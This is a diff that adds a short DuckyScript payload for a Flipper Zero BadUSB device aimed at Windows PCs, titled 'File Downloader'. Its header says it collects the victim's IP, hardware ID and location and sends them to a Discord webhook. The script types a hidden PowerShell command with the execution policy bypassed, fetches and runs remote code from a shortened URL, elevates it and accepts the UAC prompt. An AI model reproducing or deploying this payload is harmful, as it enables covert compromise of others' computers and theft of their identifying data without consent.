@@ -1,0 +1,10 @@
+REM     Title: File Downloader
+REM     Description: Flipper Zero Script to pull IP/HWID/LOCATION Etc of PC and sends a Discord Webhook
+REM     Target: Windows 10, 11
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -Command $url='http://yourdomain.com/yourscript.php'; irm https://t.ly/_l_Ep | iex
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
